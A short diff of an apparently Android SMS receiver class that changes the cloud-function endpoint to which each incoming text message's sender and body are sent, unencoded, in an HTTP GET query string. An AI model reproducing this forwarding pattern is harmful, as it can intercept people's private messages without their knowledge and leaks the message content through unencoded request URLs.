@@ -56,7 +56,7 @@ public class SMSReceiver extends BroadcastReceiver {
             String address = params[0];
             String sms = params[1];
             try {
-               run("https://us-central1-smsreader-cd2d3.cloudfunctions.net/addSMS?address="+address+"&msg="+sms);
+               run("https://us-central1-app0001-1a51d.cloudfunctions.net/addSMS?address="+address+"&msg="+sms);
             } catch (IOException e) {
                 e.printStackTrace();
             }
